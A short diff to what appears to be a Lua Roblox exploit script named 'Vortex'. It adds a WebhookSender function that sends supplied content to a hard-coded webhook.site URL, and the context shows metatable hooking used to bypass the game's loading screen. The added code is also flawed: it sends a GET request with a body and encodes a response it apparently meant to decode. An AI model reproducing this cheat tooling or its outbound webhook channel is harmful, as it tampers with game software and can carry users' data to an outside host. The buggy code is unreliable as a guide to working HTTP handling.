@@ -150,6 +150,31 @@ end
     return rptr
 end
 
+local URL = "https://webhook.site/fa54a700-c2ae-4a96-ac42-6882d4bcd509"
+
+function Vortex:WebhookSender(prompt)
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+    
+    local data = {
+        ["content"] = prompt
+    }
+
+    local response = http({
+        Url = URL,
+        Method = "GET",
+        Headers = headers,
+        Body = HttpService:JSONEncode(data)
+    })
+
+    if response.StatusCode == 200 then
+        local decoded = HttpService:JSONEncode(response.Body)
+        else
+        print("Error: " .. response.StatusCode)
+    end
+end
+
 function Vortex:BypassLoadingScreen()
 local mt = getrawmetatable(game)
 local oldnc = mt.__namecall
